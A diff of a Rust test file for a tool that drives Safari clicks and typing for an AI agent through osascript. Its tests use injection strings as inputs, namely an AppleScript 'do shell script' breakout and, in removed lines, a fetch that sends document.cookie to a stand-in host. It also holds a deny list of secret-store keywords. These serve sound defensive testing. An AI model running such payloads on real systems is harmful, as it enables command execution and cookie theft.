@@ -1,107 +1,80 @@
-use super::act::{act_script, USAGE};
-
-/// The double quotes of `s` that no backslash escapes: the ones AppleScript reads as the ends of a string.
-fn bare_quotes(s: &str) -> usize {
-    let (mut n, mut slashes) = (0, 0);
-    for c in s.chars() {
-        match c {
-            '\\' => slashes += 1,
-            '"' if slashes % 2 == 0 => {
-                n += 1;
-                slashes = 0
-            }
-            _ => slashes = 0,
-        }
-    }
-    n
-}
+use super::act::{act_args, show_script, USAGE};
+use super::choice::how;
+use super::login::login_args;
 
 #[test]
-fn a_click_runs_the_fixed_script_on_the_current_tab_or_the_named_one() {
-    let here = act_script("click", "Guardar oferta", "", "").unwrap();
-    assert!(
-        here.starts_with("tell application \"Safari\" to do JavaScript \"(function(want){")
-            && here.ends_with("\" in current tab of front window"),
-        "a click without a URL acts on the current tab:\n{here}"
+fn a_click_runs_the_fixed_script_with_the_words_as_arguments() {
+    let args = act_args("click", "Guardar oferta", "", "").unwrap();
+    assert_eq!(
+        &args[..3],
+        ["-l", "JavaScript", "-e"],
+        "JavaScript for Automation"
     );
     assert!(
-        here.contains("})(\\\"Guardar oferta\\\")"),
-        "the words ride in as a JSON string:\n{here}"
+        args[3].contains("AXUIElementPerformAction") && args[3].contains("com.apple.Safari"),
+        "the fourth is the fixed Accessibility script"
     );
     assert_eq!(
-        bare_quotes(&here),
-        4,
-        "two AppleScript strings: \"Safari\" and the JavaScript"
+        &args[4..],
+        ["click", "Guardar oferta", "", ""],
+        "then the words, as they are"
     );
-    let tab = act_script("click", "#save", "", "https://dev.epicgames.com/").unwrap();
-    assert!(
-        tab.contains(
-            "if (URL of t) starts with \"https://dev.epicgames.com/\" then return do JavaScript \""
-        ) && tab.contains("error \"no tab starts with that URL\""),
-        "a URL picks the first tab that starts with it:\n{tab}"
-    );
-}
-
-#[test]
-fn typing_carries_the_field_and_the_text_as_json_strings() {
-    let s = act_script("type", "Precio", "9,99 €\nsegunda línea", "").unwrap();
-    assert!(
-        s.contains("})(\\\"Precio\\\",\\\"9,99 €\\\\nsegunda línea\\\")"),
-        "field and text are JSON strings, a newline kept as \\n:\n{s}"
-    );
-    assert_eq!(
-        bare_quotes(&s),
-        4,
-        "two AppleScript strings: \"Safari\" and the JavaScript"
-    );
-}
-
-#[test]
-fn no_word_of_the_agent_ends_the_string_or_runs_as_code() {
-    for evil in [
-        "\") & (do shell script \"id\") & (\"",
-        "\\\") & (do shell script \\\"id\\\") & (\\\"",
-        "'); fetch('https://x/'+document.cookie); ('",
-    ] {
-        for s in [
-            act_script("click", evil, "", "").unwrap(),
-            act_script("type", "a", evil, "").unwrap(),
-        ] {
-            assert_eq!(
-                bare_quotes(&s),
-                4,
-                "the words stay inside the JavaScript's string:\n{s}"
-            );
-        }
-    }
-    let tab = act_script(
-        "click",
-        "x",
-        "",
-        "https://x/\" & (do shell script \"id\") & \"",
+    let typed = act_args(
+        "type",
+        "Precio",
+        "9,99 €\nsegunda línea",
+        "https://dev.epicgames.com/",
     )
     .unwrap();
     assert_eq!(
-        bare_quotes(&tab),
-        8,
-        "the URL is escaped too (the script's own four strings):\n{tab}"
+        &typed[4..],
+        [
+            "type",
+            "Precio",
+            "9,99 €\nsegunda línea",
+            "https://dev.epicgames.com/"
+        ],
+        "typing carries the field, the text (a newline kept) and the tab's URL"
+    );
+}
+
+#[test]
+fn no_word_of_the_agent_becomes_code() {
+    let evil = "\"); do shell script \"id\"; (\"";
+    let args = act_args("click", evil, "", "").unwrap();
+    assert_eq!(
+        args[5], evil,
+        "the words are an argument of osascript, not part of the script"
+    );
+    assert!(
+        !args[3].contains("shell script"),
+        "the script is the fixed one"
+    );
+    let shown = show_script("https://x/\" & (do shell script \"id\") & \"");
+    assert!(
+        shown.contains("starts with \"https://x/\\\" & (do shell script \\\"id\\\") & \\\"\" then"),
+        "a URL brought forward is escaped into Safari's own script:\n{shown}"
     );
 }
 
 #[test]
 fn the_fixed_script_never_reads_what_the_owner_keeps() {
-    let s = act_script("type", "a", "b", "").unwrap() + &act_script("click", "a", "", "").unwrap();
+    let s = &act_args("click", "a", "", "").unwrap()[3];
     for word in [
         "cookie",
         "localStorage",
         "sessionStorage",
         "indexedDB",
+        "password",
+        "Keychain",
         "fetch(",
-        "XMLHttpRequest",
-        "eval(",
     ] {
         assert!(!s.contains(word), "the script holds no {word}");
     }
+    assert!(
+        !s.contains("do JavaScript"),
+        "it needs no Safari setting (Allow JavaScript from Apple Events)"
+    );
 }
 
 #[test]
@@ -113,12 +86,53 @@ fn what_is_not_a_click_or_a_typing_is_refused() {
         ("click", "a", "", "https://x/\n"),
         ("type", "a", "b\u{1b}", ""),
         ("eval", "a", "", ""),
-        ("open", "a", "", ""),
     ] {
         assert_eq!(
-            act_script(cmd, target, text, url),
+            act_args(cmd, target, text, url),
             Err(USAGE.to_string()),
             "{cmd} {target:?} {text:?} {url:?} is refused"
         );
     }
+}
+
+#[test]
+fn each_browser_says_how_to_act_and_where_to_sign_in() {
+    assert!(how("safari").contains("tirith safari open") && how("safari").contains("click"));
+    assert!(
+        how("openbot").contains("tirith browser login") && how("openbot").contains("browser tools")
+    );
+    assert_eq!(
+        how("anything else"),
+        how("openbot"),
+        "OpenBot's own until the owner chooses"
+    );
+}
+
+#[test]
+fn the_sign_in_window_shares_the_agents_profile_and_keychain() {
+    let profile = std::path::Path::new("/h/browser/profile");
+    let args = login_args(
+        "/Applications/Microsoft Edge.app",
+        profile,
+        "https://dev.epicgames.com/",
+    );
+    assert_eq!(
+        &args[..4],
+        ["-n", "-a", "/Applications/Microsoft Edge.app", "--args"]
+    );
+    for want in [
+        "--user-data-dir=/h/browser/profile",
+        "--use-mock-keychain",
+        "--password-store=basic",
+    ] {
+        assert!(
+            args.iter().any(|a| a == want),
+            "the agents' browser has {want}, so its cookies read there"
+        );
+    }
+    assert_eq!(
+        args.last().unwrap(),
+        "https://dev.epicgames.com/",
+        "the page comes last"
+    );
 }
